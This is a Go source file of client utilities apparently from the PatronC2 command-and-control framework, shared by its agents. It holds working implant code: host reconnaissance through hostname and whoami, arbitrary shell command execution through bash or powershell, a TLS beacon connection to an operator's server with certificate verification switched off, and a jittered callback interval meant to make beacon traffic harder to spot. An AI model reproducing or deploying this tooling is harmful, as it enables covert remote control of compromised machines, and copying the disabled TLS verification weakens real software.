package client_utils

// collection of utilities used by all agents

import (
	"crypto/tls"
	"encoding/gob"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"os/exec"
	"runtime"
	"strconv"
	"time"

	"github.com/google/uuid"

	"github.com/PatronC2/Patron/types"
	"github.com/PatronC2/Patron/lib/logger"
	"github.com/PatronC2/Patron/lib/common"
)


func Initialize() {
	logger.EnableLogging(true)
	if err := logger.SetLogFile("app.log"); err != nil {
		fmt.Printf("Error setting log file: %v\n", err)
	}
	common.RegisterGobTypes()
}

func LoadCertificate(RootCert string) (*tls.Config, error) {
	publicKey, err := base64.StdEncoding.DecodeString(RootCert)
	if err != nil {
		return nil, err
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(publicKey) {
		return nil, fmt.Errorf("failed to parse root certificate")
	}
	return &tls.Config{RootCAs: roots, InsecureSkipVerify: true}, nil
}

func GenerateAgentMetadata() (string, string, string) {
	agentID := uuid.New().String()
	var hostname string
	var username string

	if runtime.GOOS == "windows" {
		hostname = RunShellCommand("hostname")
	} else {
		hostname = RunShellCommand("hostname -f")
	}
	username = RunShellCommand("whoami")
	if hostname == "" { hostname = "unknown-host" }
	if username == "" { username = "unknown-user" }
	return agentID, hostname, username
}

func RunShellCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell", "-Command", command)
	} else {
		cmd = exec.Command("bash", "-c", command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		logger.Logf(logger.Error, "Error running command: %v", command)
		return err.Error()
	}
	logger.Logf(logger.Done, "Ran command: %v", command)
	return string(output)
}

func EstablishConnection(config *tls.Config, ServerIP string, ServerPort string) (*tls.Conn, *gob.Encoder, *gob.Decoder, error) {
	beacon, err := tls.Dial("tcp", fmt.Sprintf("%s:%s", ServerIP, ServerPort), config)
	if err != nil {
		logger.Logf(logger.Error, "Error occurred while connecting: %v", err)
		return nil, nil, nil, err
	}
	return beacon, gob.NewEncoder(beacon), gob.NewDecoder(beacon), nil
}

func GetLocalIP(beacon *tls.Conn) string {
	return beacon.LocalAddr().(*net.TCPAddr).IP.String()
}

func SendRequest(encoder *gob.Encoder, reqType types.RequestType, payload interface{}) error {
	return encoder.Encode(types.Request{Type: reqType, Payload: payload})
}

func HandleError(beacon *tls.Conn, reqType string, err error) {
	logger.Logf(logger.Error, "Error during %s request: %v", reqType, err)
	beacon.Close()
	time.Sleep(2 * time.Second)
}

func CalculateSleepInterval(CallbackFrequency string, CallbackJitter string) float64 {
	rand.Seed(time.Now().UnixNano())
	frequency, _ := strconv.Atoi(CallbackFrequency)
	jitter, _ := strconv.Atoi(CallbackJitter)
	jitterPercent := float64(jitter) * 0.01
	baseTime := float64(frequency)
	variance := baseTime * jitterPercent * rand.Float64()
	return baseTime - (jitterPercent * baseTime) + 2*variance
}